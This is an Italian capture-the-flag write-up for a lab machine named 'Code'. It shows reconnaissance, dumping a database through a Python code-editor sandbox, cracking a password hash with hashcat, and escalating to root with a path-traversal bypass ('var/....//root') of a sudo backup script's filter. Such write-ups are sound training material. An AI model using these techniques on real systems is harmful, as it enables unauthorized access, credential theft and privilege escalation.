# 💻 Code CTF - Walkthrough

## 🔍 Ricognizione Iniziale

Ho eseguito una scansione con `nmap`:

```bash
nmap -sC -sV -A 10.10.11.62
```

Ho rilevato due porte aperte:

- **🛡️ Porta 22** → SSH  
- **⚙️ Porta 5000** → HTTP (servito da Gunicorn)

Accedendo al sito sulla porta 5000, ho trovato un'interfaccia web di un **Python code editor**. Ho provato una code injection base, ma ho ricevuto il messaggio:

```
Use of restricted keywords is not allowed
```

---

## 🔬 Esplorazione dell'Editor Python

Utilizzando il comando:

```python
print(globals())
```

Ho ottenuto un elenco delle variabili e moduli caricati. Tra questi ho individuato un oggetto `db`, possibile istanza di un database.

Ho verificato con:

```python
print(dir(db))
```

Confermata la presenza del database, ho eseguito il dump degli utenti con:

```python
for user in User.query.all():
    print(user.__dict__)
```

✅ Ho scoperto un utente chiamato **martin** con la password hashata.

---

## 🔑 Cracking della Password

Ho salvato l'hash e l'ho crackato usando `hashcat`:

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

✅ Password trovata! Ho poi effettuato l'accesso via SSH:

```bash
ssh martin@10.10.11.62
```

Tuttavia, la **user flag** non era nella home directory.

---

## 🧍‍♂️ Privilege Escalation a app-program

Ho notato la presenza di un altro utente: **app-program**, ma non avevo i permessi per accedere alla sua home.

Ho controllato i privilegi sudo con:

```bash
sudo -l
```

Ho scoperto che potevo eseguire uno script di **backup** come `app-program`:

```bash
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### 🔍 Analisi del Backup

Il backup utilizza un file JSON come input. Accedendo alla cartella dei backup, ho trovato un archivio `.tar`:

```bash
scp martin@10.10.11.62:backups/code_home_app-production_app_2024_August.tar.bz2
tar -xvjf code_home_app-production_app_2024_August.tar.bz2
```

✅ All’interno ho trovato la **user flag**!

---

## 🚀 Privilege Escalation a Root

Il file task.json per il backup accetta solo cartelle sotto `/var` o `/home`. Per accedere a `/root`, ho usato un path malformato:

```
var/....//root
```

Questo ha aggirato il filtro che bloccava i `../`.

Ho modificato task.json, rieseguito il backup:

```bash
sudo /usr/bin/backy.sh task.json
```

e scaricato l’archivio risultante:

```bash
scp martin@10.10.11.62:/backups/code_home_app-production_2025_April.tar.bz2 .
tar -xvjf code_home_app-production_2025_April.tar.bz2
```

✅ All’interno ho trovato la **root flag**!

---

## 🎯 Conclusione

CTF **Code** completata con successo! 🧩

- Accesso ottenuto tramite code injection nel Python editor
- Dump degli utenti dal DB e crack della password
- Escalation tramite script di backup e manipolazione JSON
- Flag utente e root acquisite! 🏁